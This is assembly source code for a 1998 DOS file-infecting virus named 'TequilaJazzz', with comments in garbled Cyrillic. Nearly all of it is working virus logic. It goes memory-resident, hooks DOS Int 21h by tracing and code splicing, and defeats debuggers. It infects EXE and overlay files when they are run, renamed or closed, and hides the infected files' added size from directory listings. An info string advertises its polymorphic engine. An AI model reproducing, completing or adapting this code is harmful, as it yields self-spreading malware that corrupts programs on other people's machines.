   TeqJazDemo  equ 'TJiw'
   TeqJazInfo  equ 'TInf'
   TequilaJiD  equ 'TeqJ'
   AnswerID    equ 'JaZz'
   MCBSign     equ 0
   OwnerAddress    equ 1
   LenOfBLOK   equ 3
   TrF     equ 1
   GARBLELen   equ 5
   MinPRCLen   equ 130
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


           .486
           .model  small
   TeqJazzz    segment para public use16 'code'
           assume  cs:TeqJazzz,ds:TeqJazzz

   TequilaJazzz    proc

           call    TequilaBase
   TequilaBase:    mov bp,sp
           mov al,[bp]
           mov ah,[bp+1]
           sub ax,offset TequilaJazzz+3
           inc sp
           inc sp
           mov si,ax
           mov word ptr cs:[si+TeqBASE],ax
           sti
                          ; ’¥áâ ¯à®æ¥áá®à 
           pushf              ; i286  : 15 ¡¨â FLAGS = 1
           pop ax         ; i386+ : 15 ¡¨â EFLAGS = 0
           or  ah,10000000b
           push    ax
           popf
           pushf
           pop ax
           test    ah,10000000b
           jz  Its386&Higher  ; *¨¦¥ âà®©ª¨ ¥ ¯®©¤¥â

           mov al,90h               ; NOP ¢¬¥áâ® 66h
           mov byte ptr cs:[si+PopAll],al
           mov byte ptr cs:[si+PopFlag],al
           jmp ExitTequilaJaz

   Its386&Higher:
           pop es
           pop ds
           popa
           popf
           pushfd
           pushad         ; ‘®åà ¨¬ ¢á¥ 32 à §àï¤ë¥ à¥£¨áâàë
           push    ds
           push    es

           mov si,0000h
   TeqBASE     equ $ - 2

           mov ax,0FF55h     ; *à¨áãâáâ¢ã¥¬ ¢ ¯ ¬ïâ¨ ?
           mov edx,TequilaJiD
           push    cs
           pop ds
           mov bx,offset Generation   ; ‘áë«ª    ¯®ª®«¥¨¥
           int 21h
           cmp edx,AnswerID
           je  ExitTequilaJaz

           mov dx,ParaLenWSP+1 ; Žá¢®¡®¤¨¬ á¥¡¥ ¬¥áâ 
           call    ReAllocateMEM

           mov ah,48h      ; ‚ë¤¥«ï¥¬ á¥¡¥ ¡«®ª
           mov bx,dx
           dec bx
           int 21h
           jc  ExitTequilaJaz

           mov es,ax
           dec ax
           mov ds,ax
           mov word ptr ds:[OwnerAddress],8h   ; Ÿ ªàãç¥ DOS !

           push    cs         ; *¥à¥¥§¦ ¥¬...
           pop ds
           mov cx,[si+LenPreparePart]  ; ‘ ¬ ¢¨àãá ¨
           add cx,TequilaLen       ; ç áâì § â¥àâ®© ¯à®æ¥¤ãàë
           cld
           xor di,di
           rep movsb        ; ‚á¥ á¢®¥ ®èã á á®¡®©

           push    es
           push    offset Continue
           retf
   Continue:
           push    cs
           pop ds

   ; *¥à¥å¢ â¨¬ Int 21h : ˆ§¢à é âìáï ®á®¡® ¥ ¡ã¤¥¬
   ; *à®âà áá¨àã¥¬ Int 21h - ç¥à¥§ Int 1 ¯®«ãç¨¬ ®à¨£¨ «ìë© Int 21h

           xor ax,ax
           mov es,ax

           mov eax,es:[21h*4]       ; ’ ¡«¨çë© Int 21h
           mov [RealInt21],eax
           mov [Work],offset TestDOS

           mov ah,2Ch
           call    TraceDOS     ; € ¬ë âãâ ¯«îèª ¬¨ ¡ «ã¥¬áï ...

   ; „¥« ¥¬ á¯« ©á¨£ ¢ DOS
   ; áâ ¤ àâë¬ JMP'®¬ ¢ ¢¨àãá

           mov [Work],offset RestoreJump

           mov byte ptr [DOSbytes],0EAh
           mov word ptr [OldDOSbytes],offset TeqJazInt21
           mov word ptr [OldDOSbytes + 2],cs
           call    ExchangeDOS

   ; *¥à¥ãáâ ®¢¨¬  ¤à¥á à®¤¨â¥«ìáª®£® ¯à®æ¥áá  ¢ PSP   á¥¡ï
   ; ¤«ï ¯®á«¥¤ãîé¥£® ¯¥à¥¥§¤  ¢¨§

           mov ah,62h
           call    DOS

           mov es,bx
           mov di,0Ah
           mov eax,es:[di]
           mov [ParentAddress],eax   ; Parental Address
           mov ax,cs
           shl eax,10h
           mov ax,offset MoveToLowMEM
           cld
           stosd

           xor si,si

   ExitTequilaJaz:

           les di,[si+ProcAddress]  ; €¤à¥á § à ¦¥®© ¯à®æ¥¤ãàë
           mov ah,62h
           int 21h
           add bx,10h

           mov ax,es
           add ax,bx
           mov es,ax

           push    cs
           pop ds

           mov word ptr [si+ReturnToPROC],di     ; „«ï ¢ëå®¤ 
           mov word ptr [si+ReturnToPROC+2],es

           mov bx,si
           mov cx,[si+LenPreparePart]
           add si,TequilaLen
                         ; ‚®ááâ  ¢«¨¢ ¥¬ ¯à®æ¥¤ãàã
           rep movsb

   ; ‚®ááâ ®¢¨¬ ¢ëå®¤ ¨§ ¯à®æ¥¤ãàë
   ; *à®æ¥¤ãà  ¡ë«  ¯®«®áâìî § ¬ áª¨à®¢   : § â¥àâ ¨ ¢ëå®¤ ¨ ¢å®¤

           mov di,[bx+ExitPROC]
           mov ax,[bx+OldBytes]   ; * ©âë ¢ëå®¤  ¨§ ¯à®æ¥¤ãàë -
           mov es:[di],ax     ; POP BP,RETF/RETN

           jmp $+2 ; *®è«¥¬ ¨å á® á¢®¨¬ ª®¢¥©¥à®¬...

           pop es     ; ‚®ááâ  ¢«¨¢ ¥¬ ‚á¥ à¥£¨áâàë
           pop ds
   PopAll:     popad
   PopFlag:    popfd
           db  0EAh   ; Jmp far PROC
   ReturnToPROC    dd  0
   TequilaJazzz    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   MoveToLowMEM    proc
           push    ax
           mov ah,48h      ; „¥« ¥¬ ®¢ë© ¢¨§ã
           mov bx,ParaLenWSP
           call    DOS
           jc  GotoParent  ; Ž¡«®¬ ¥¬áï ¬ë á ¯¥à¥¥§¤®¬...

           mov es,ax
           dec ax
           mov ds,ax
           mov word ptr ds:[OwnerAddress],8 ; ‚« ¤¥«¥æ ¡«®ª  DOS.

           push    cs
           pop ds

           xor si,si        ; ‘®¢    ®¢ãî ª¢ àâ¨àã
           xor di,di
           cld
           mov cx,TequilaLen
           rep movsb

           lds si,[RealInt21]
           cmp word ptr [si+1],offset TeqJazInt21
           jne JmpIsHeRe

           call    ExchangeDOS  ; *®¢ë© á¥£¬¥â ®¡à ¡®âç¨ª 
   JmpIsHeRe:
           mov word ptr cs:[OldDOSbytes + 2],es
           call    ExchangeDOS

           mov ax,cs       ; Žá¢®¡®¦¤ ¥¬ íâ®â ¡«®ª
           mov es,ax
           mov ah,49h
           call    DOS
   GotoParent:
           pop ax
           db  0EAh
   ParentAddress   dd  0
   MoveToLowMEM    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TeqJazInt21 proc
   ; *à®¢¥àª    âà áá¨à®¢ªã

           pushf

           jmp ExitTeqInt21    ; Žâ¢ «¨ ª®§¥«...

           push    ax
           push    ss      ; *â® ¥á«¨ ¢ âà áá¨à®¢é¨ª¥ ¨á¯®«ì§®¢ 
           db  2Eh,3Eh,26h,36h ; â ª®© ¦¥ ¯à¨¥¬ ª ª ¨ ã  á
           pop ss      ; (á¡à áë¢ ¨¥ TF ¯à¨ pushf)

           pushf
           pop ax
           test    ah,1        ; TF is ON!
           pop ax

           jnz ExitTeqInt21    ; Žâ¢ «¨ ª®§¥«...

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; *â® ¬ë âãâ  áâëà® «¥§¥¬ ?
           cmp ax,0FF55h
           jne Farther     ; „ «ìè¥...

           cmp edx,TequilaJiD  ; ˆ¤¥â¨ä¨ª æ¨ï ?
           jne TeqIdentify

           mov edx,ds:[bx+si]       ; SI - ¡ § 
           cmp edx,cs:[Generation]  ; BX - á¬¥é¥¨¥ Generation á SI=0
           jb  OldVersion
           mov cs:[Generation],edx  ; Ž¡®¢«ï¥¬ ¯®ª®«¥¨¥
   OldVersion:
           mov edx,AnswerID         ; Žâ¢¥â
           popf
           iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TeqIdentify:
           cmp edx,TeqJazInfo   ; ‚ë¤ ç  ¨ä®à¬ æ¨¨ ?
           jne OtherTJ

           push    ax
           push    dx
           push    ds

           mov ax,3
           int 10h

           push    cs
           pop ds
           mov dx,offset TequilaInfo

           mov ah,9h
           call    DOS
           pop ds
           pop dx
           pop ax
           popf
   ExitOurFunc:    iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   OtherTJ:
           cmp edx,TeqJazDemo
           jne ExitTeqInt21    ; *¥  è  äãªæ¨ï

           push    ax
           push    dx
           push    ds

           mov ax,13
           int 10h

           push    cs
           pop ds
           call    TequilaDemo

           mov ax,3
           int 10h

           mov dx,offset DemoInfo
           mov ah,9
           call    DOS

           pop ds
           pop dx
           pop ax
           popf
           iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Œ áª¨à®¢ª  ¯® 4Eh,4Fh
   Farther:
           cmp ah,4Fh
           je  StealthNext
           cmp ah,4Eh
           jne Further     ; „ «ìè¥,¤ «ìè¥...

   StealthInfect:
           push    di
           push    es
           mov di,offset StealthPath
           push    cs
           pop es

           clc
           call    CopyPath    ; ‘ª®¯¨àã¥¬ ¯ãâì ¥á«¨ ¨éãâ ä ©«
           pop es
           pop di
   StealthNext:
           popf            ; ”« £¨ !
           call    DOS
           jc  FileNotFound    ; ” ©«®¢ ¥  è«¨

           pushf
           push    es
           push    ds
           pusha

           mov ah,2Fh        ; ES:BX - DTA
           call    DOS
           push    es
           pop ds

           test    byte ptr [bx+15h],00011100b
                         ; …á«¨ ¨éãâ ¬¥âªã â®¬  ¨«¨ ª â «®£
           jnz GetOut        ; ¨«¨ á¨áâ¥¬ë© â®   ¢ëå®¤

           lds si,[bx+1Eh]   ; €¤à¥á ¨¬¥¨ ä ©« 
           push    cs
           pop es
           call    AddFileName   ; *à¨á®¥¤¨¨¬ ª ¯ãâ¨  ©¤¥ë© ä ©«

           call    TestPath      ; EXE,OVL,OVR
           jnz GetOut

           mov word ptr cs:[FileName],offset StealthPath
           mov word ptr cs:[FileName + 2],cs
           call    TestFile    ; *à®¢¥à¨¬
           jnz GetOut      ; ZF=1 - ¥á«¨ ä ©« ã¦¥ § à ¦¥

           mov ax,word ptr cs:[Header+ChkSum]
                              ; „«¨  ¢¨àãá  ¢ § à ¦¥®¬ ä ©«¥
                              ; (•à ¨âáï ¢ § £®«®¢ª¥)
           sub [bx+1Ah],ax        ; “ª®à®â¨¬...:)
           sbb word ptr [bx+1Ch],0
   GetOut:
           popa
           pop ds
           pop es
           popf
   FileNotFound:
           retf    2
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; ‡ £àã§ª  ¨ ¢ë¯®«¥¨¥
   Further:
           cmp ah,4Bh
           je  FileFunction
           cmp ah,43h
           je  FileFunction
           cmp ah,56h
           jne HandlesFunc
   FileFunction:
           call    TestPath
           jc  DontFuckFile

           mov word ptr cs:[FileName],dx
           mov word ptr cs:[FileName + 2],ds
           call    MainInfect
   DontFuckFile:
           jmp ExitTeqInt21
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; ”ãªæ¨¨ ¯®«ãç¥¨ï Handle
   HandlesFunc:
           cmp ah,3Ch
           je  CreateOpen
           cmp ah,5Bh
           je  CreateOpen
           cmp ah,3Dh
           jne Close
   CreateOpen:
           cmp word ptr cs:[InfHandle],0
           jnz ExitTeqInt21

           popf
           call    DOS
           jc  OpenFailure
           pushf

           call    TestPath       ; *®á¬®âà¨¬ ¯ãâì
           jc  DontRemember       ; *¥ § ¯®¬¨ âì Handle

           clc            ; ‘ª®¯¨àã¥¬ ¯ãâì
           call    CopyPath
           mov word ptr cs:[InfHandle],ax

   DontRemember:   pop di
           pop es
           popf
   OpenFailure:    retf    2
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   Close:
           cmp ah,3Eh        ; *à®á¨«¨ çâ® â® ¤àã£®¥ ...
           jne ExitTeqInt21

           push    ax        ; ‡ ªàë¢ îâ â®â çâ® ®âªàë¢ «¨ ?
           mov ax,0000h
   InfHandle   equ $ - 2
           cmp bx,ax
           pop ax
           jne ExitTeqInt21

           popf              ; ‡ ªà®¥¬
           call    DOS
           jc  FPBCorrupted      ; *… § ªàë«áï

           mov word ptr cs:[FileName],offset TeqFilePath
           mov word ptr cs:[FileName + 2],cs
           call    MainInfect
           mov word ptr cs:[InfHandle],0
   FPBCorrupted:
           retf    2
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ExitTeqInt21:
           popf
           call    DOS
           retf    2
   TeqJazInt21 endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TeqJazInt1  proc
   ; ’à áá¨àã¥â Int 21 ¨ í¬ã«¨àã¥â PUSHF/POPF

           mov word ptr cs:[KeepDS],ds
           mov word ptr cs:[KeepBX],bx
           mov word ptr cs:[KeepAX],ax
           mov word ptr cs:[KeepDX],dx

           pop bx        ; DS:BX -  ¤à¥á á«¥¤ãîé¥© ª®¬ ¤ë
           pop ds
           pop cs:[Flags]

           call    cs:[Work]

           mov word ptr cs:[CurCMD],bx
   TestPrefix:
           mov al,[bx]
           and al,11100111b
           cmp al,00100110b        ; ES/CS/SS/DS
           jne TestCoMD
           inc bx
           jmp TestPrefix
   TestCoMD:
           mov ax,[bx]
           cmp al,17h        ; *¬ã«¨¬ POP SS
           jne NotSS
           inc bx
           cli
           pop ss
           sti
   NotSS:
           jmp $+2
           mov al,[bx]
           cmp al,9Ch        ; PUSHF
           je  ItsPushf
           cmp al,9Dh        ; POPF
           je  ItsPopf

           mov bx,0000h
   CurCMD      equ $ - 2
           jmp ExitTeqInt1
   ItsPopf:
           inc bx        ; ‘â ¢¨¬ TF ¢ POPF
           pop ax
           or  ah,TrF
           push    ax
           jmp GoExit1
   ItsPushf:
           inc bx        ; “¡¨à ¥¬ TF ¢ PUSHF
           mov dx,cs:[Flags]
           and dh,NOT TrF
           push    dx
   ExitTeqInt1:
           push    cs:[Flags]
   GoExit1:    push    ds
           push    bx

           mov ax,0000h
   KeepDS      equ $ - 2
           mov ds,ax
           mov bx,0000h
   KeepBX      equ $ - 2
           mov ax,0000h
   KeepAX      equ $ - 2
           mov dx,0000h
   KeepDX      equ $ - 2
           iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TestDOS:
           mov ax,ds
           cmp ax,0300h      ; DOS ?
           jb  ItsDOS
           cmp ax,0C800h     ; Hi DOS ?
           jb  @return
   ItsDOS:
           mov word ptr cs:[RealInt21],bx    ; * áâ®ïé¨© Int 21h
           mov word ptr cs:[RealInt21+2],ax
   OutInInt1:
           push    es
           push    0000h
           pop es
           mov dword ptr es:[1h*4],12345678h
   DOSInt1     equ $ - 4
           pop es
           and byte ptr cs:[Flags+1],NOT TrF   ; ‘¡à®á¨¬ TF
   @return:    ret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   RestoreJump:
           mov al,0
   TraceCounter    equ $ - 1
           inc byte ptr cs:[TraceCounter]
           cmp al,8
           jb  @return

           call    ExchangeDOS
           mov byte ptr cs:[TraceCounter],0
   TrRET:      jmp OutInINT1
   TeqJazInt1  endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   CopyPath    proc
   ; Š®¯¨à®¢ ¨¥ ¯ãâ¨
   ; DS:DX - ¨áâ®ç¨ª
   ; ES:DI - ¯à¨¥¬¨ª ¥á«¨ CF=1

           push    ax
           push    es
           push    di
           push    si
           jc  UnDefine

           push    cs     ; ‚ ¯ãâì ...
           pop es
           mov di,offset TeqFilePath
   UnDefine:
           push    dx
           pop si
           push    si
           cld
   FindZero:
           lodsb
           test    al,al
           jnz FindZero

           pop ax
           sub si,ax
           cmp si,80h
           jnb NotPath       ; ‚¬¥áâ® ¯ãâ¨ ¯®¤áãã«¨ ª ª®¥ â® £ ¢®

           push    ax
           pop si

           mov word ptr cs:[EndDir],ax
   CopyDir:
           lodsb
           stosb
           cmp al,'\'
           jne $+5
           mov word ptr cs:[EndDir],si

           cmp al,'/'
           jne $+5
           mov word ptr cs:[EndDir],si

           test    al,al
           jnz CopyDir
   NotPath:
           pop si
           pop di
           pop es
           pop ax
           ret
   CopyPath    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   AddFileName proc
   ; *à¨á®¥¤¨¥¨¥ ¨¬¥¨ ä ©« 
   ; DS:SI - ¨¬ï ä ©« 
   ; ES: - á¥£¬¥â § à ¥¥ !!! áª®¯¨à®¢ ®£® ¯ãâ¨

           push    di
           push    ax

           mov di,1234h
   EndDir      equ $ - 2
           cld
   CopyName:
           lodsb
           stosb
           test    al,al
           jnz CopyName

           pop ax
           pop di
           ret
   AddFileName endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TestPath    proc
   ; DS:DX - ¯ãâì á â¥áâ¨àã¥¬ë¬ ä ©«®¬
   ; ZF=0 - *¥§ à ¦ ¥¬ë© ä ©«
   ; ZF=1 - ‡ à ¦ ¥¬ë© ä ©«

           push    ax
           push    si

           push    dx
           pop si

           cld
   FndZero:
           lodsb
           test    al,al
           jnz FndZero

           cmp byte ptr [si-5],'.'  ; *¥§ à áè¨à¥¨ï ¨«¨ á ª®à®âª¨¬
           jne FailurePath

           mov ax,[si-4]
           and ax,0DFDFh      ; ¯à¨¢®¤¨¬ ª ¢¥àå¥¬ã à¥£¨áâàã
           cmp ax,'XE'        ; EXE
           jne FailurePath
           cmp ax,'VO'        ; OVL/OVR
   FailurePath:
           pop si
           pop ax
           ret
   TestPath    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ExchangeDOS proc
           pushf
           push    di
           push    ds
           push    eax

           cli
           lds di,cs:[RealInt21]

           mov al,12h
   DOSbytes    equ $ - 1
           xchg    [di],al
           mov byte ptr cs:[DOSbytes],al

           mov eax,12345678h
   OldDOSbytes equ $ - 4
           xchg    [di+1],eax
           mov dword ptr cs:[OldDOSbytes],eax

           pop eax
           pop ds
           pop di
           popf
           ret
   ExchangeDOS endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   DOS     proc
           call    ExchangeDOS   ; ‚®ááâ ®¢¨¬ áâ àë¥ DOS'®¢áª¨¥ ¡ ©â¨ª¨
   DOS     endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   TraceDOS    proc
           pushf
           push    eax
           pushf
           push    es

           xor ax,ax
           mov es,ax

           cli
           mov ax,cs            ; ‘â ¢¨¬ Int 1
           shl eax,10h
           mov ax,offset TeqJazInt1
           xchg    es:[1h*4],eax
           mov dword ptr [DOSInt1],eax
           sti

           pop es
           popf
           pushf           ; Set Trace Flag
           pop ax
           or  ah,TrF
           push    ax
           popf

           pop eax
           db  9Ah       ; Š ¯ ¯®çª¥...
   RealInt21   dd  0
           ret
   TraceDOS    endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   Include     teqdemo.asm    ; Includes...
   Include     phantom.asm
   Include     trash.asm
   Include     uepinf.asm
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ReAllocateMEM   proc
   ; *à¥¤¯®« £ ¥âáï çâ® ¡«®ª ã¦¥ ¨§¬¥¥ïâìáï ¯à£à ¬¬®© ¥ ¡ã¤¥â
   ; ZF=1 - “¤ ç® ®¡à¥§ «¨ ¡«®ª
   ; ZF=0 - ¥ã¤ ç®
           push    ds

           mov ah,62h
           int 21h

           mov es,bx
           dec bx
           mov ds,bx

           mov eax,TequilaJiD ; ˆ¤¥â¨ä¨ª â®à à á¯à¥¤¥«¥®áâ¨ ¡«®ª 
           mov word ptr bx,ds:[LenOfBlOK]   ; „«¨  ¡«®ª 

           cmp byte ptr ds:[MCBSign],'M'
           jne Realloc

           cmp dword ptr es:[0F0h],eax  ; *¥à¥à á¯à¥¤¥«¥®  ¬¨ ?
           jne DontReAlloc

           cmp word ptr es:[0F4h],bx    ; Šâ® â® ¨§¬¥ï« ã¦¥
           jne DontReAlloc      ; ¯®á«¥  á
   Realloc:
           mov dword ptr es:[0F0h],eax  ; “áâ ®¢¨¬

           sub bx,dx
           mov ah,4Ah
           int 21h

           sub word ptr es:[0F4h],dx    ; *®¢ ï ¤«¨  ¡«®ª 
           sub word ptr es:[2],dx
           xor ax,ax
   DontReAlloc:    pop ds
           ret
   ReAllocateMEM   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ TequilaJazzz Data Area ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ProcAddress dd  4
   FileName    dd  0
   Generation  dd  0

   Work        dw  0
   flags       dw  0
   handle      dw  0
   OldBytes    dw  9090h
   TeqCopyID   dw  0
   LenPreparePart  dw  0

   RELOFFS     dw  0
   DEST_CODE   dw  0
   COUNTER     dw  0
   TARGETPLACE dd  0
   LENDECRYPTOR    dw  0

   TequilaInfo db  'VirName     : TequilaJazzz',13,10
           db  'Author      : DaemonSerJ',13,10
           db  'Copyleft    : (C) 1998 Russia,Nsk,NSTU',13,10
           db  'HookDOS     : Trace , Splice',13,10
           db  'Memory      : LowMEM',13,10
           db  'Infect      : UEP.EXE.Infecting',13,10
           db  'Polymorph   : DirectPhantom v2.1',13,10
           db  'AttackSpeed : Fast',13,10
           db  'Destructive : None',13,10
           db  13,10,'...“¤ ç¨ ¢ ¡®àì¡¥ á ¢¨àãá ¬¨...:)',13,10,'$'

   TequilaLen  equ offset $
   TeqFilePath equ $
   StealthPath equ $+80h
   Header      equ $+100h

   ParaLenWSP  equ (5000+120h)/16+1

   TeqTempWSP  equ 5000+700h+MinPRCLen*2

   TeqJazzz    ends
                   end     TequilaJazzz
